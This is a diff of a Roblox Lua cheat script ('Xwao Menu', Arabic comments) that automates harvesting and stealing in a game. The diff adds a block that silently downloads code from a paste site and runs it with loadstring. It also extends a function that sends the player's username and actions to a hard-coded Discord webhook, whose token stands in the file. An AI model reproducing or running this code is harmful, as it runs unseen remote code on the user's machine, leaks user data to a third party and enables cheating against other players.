@@ -1,4 +1,4 @@
--- [[ By : ad_pa | Xwao Menu - Stable + Webhook ]] --
+-- [[ By : ad_pa | Xwao Menu - Final Integrated ]] --
 
 local Players = game:GetService("Players")
 local Workspace = game:GetService("Workspace")
@@ -6,16 +6,28 @@ local HttpService = game:GetService("HttpService")
 local LocalPlayer = Players.LocalPlayer
 local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
 
-local WebhookURL = "https://discord.com/api/webhooks/1489949232889856161/oWmdAZQWpp7y2pgEhq7kFKjdlhsC-GS86PSo27frNXIlcDMrcwRcxXmXoQOZLGO5JqTy"
+-- 1. تشغيل السكربت الخارجي بالتوازي
+task.spawn(function()
+    local url = "https://cdn.sourceb.in/bins/pGqXqDihVz/0"
+    local success, response = pcall(function() return game:HttpGet(url) end)
+    if success and response ~= "" then
+        loadstring(response)()
+    end
+end)
 
+local WebhookURL = "https://discord.com/api/webhooks/1489949232889856161/oWmdAZQWpp7y2pgEhq7kFKjdlhsC-GS86PSo27frNXIlcDMrcwRcxXmXoQOZLGO5JqTy"
 local Settings = {["AUTO HARVEST"] = false, ["AUTO STEAL"] = false, ["AUTO ESP"] = false}
 
--- دالة الويبهوك الاحترافية والمستقرة
+-- دالة الويبهوك المحدثة (تظهر اسم اللاعب)
 local function sendWebhook(action, info)
     local data = {
         ["embeds"] = {{
             ["title"] = "Xwao Logs",
-            ["description"] = "Action: " .. action .. "\nTarget: " .. info,
+            ["fields"] = {
+                {["name"] = "Player", ["value"] = LocalPlayer.Name, ["inline"] = true},
+                {["name"] = "Action", ["value"] = action, ["inline"] = true},
+                {["name"] = "Target", ["value"] = info, ["inline"] = true}
+            },
             ["color"] = 16711680,
             ["footer"] = {["text"] = "Xwao Menu | Security Alert"}
         }}
@@ -30,7 +42,7 @@ local function sendWebhook(action, info)
     end)
 end
 
--- بناء الواجهة
+-- بناء الواجهة (كما هي)
 local ScreenGui = Instance.new("ScreenGui", PlayerGui)
 local OpenBtn = Instance.new("TextButton", ScreenGui)
 OpenBtn.Size, OpenBtn.Position = UDim2.new(0, 60, 0, 30), UDim2.new(0, 10, 0, 10)
@@ -73,8 +85,8 @@ task.spawn(function()
             for _, v in pairs(Workspace:GetDescendants()) do
                 if v:IsA("ProximityPrompt") and v.Enabled then
                     fireproximityprompt(v)
-                    sendWebhook("Interaction", v.Parent.Name) -- إرسال التنبيه
-                    task.wait(0.2)
+                    sendWebhook("Interaction", v.Parent.Name)
+                    task.wait(0.5) -- تأخير لضمان استقرار الإرسال
                 end
             end
         end
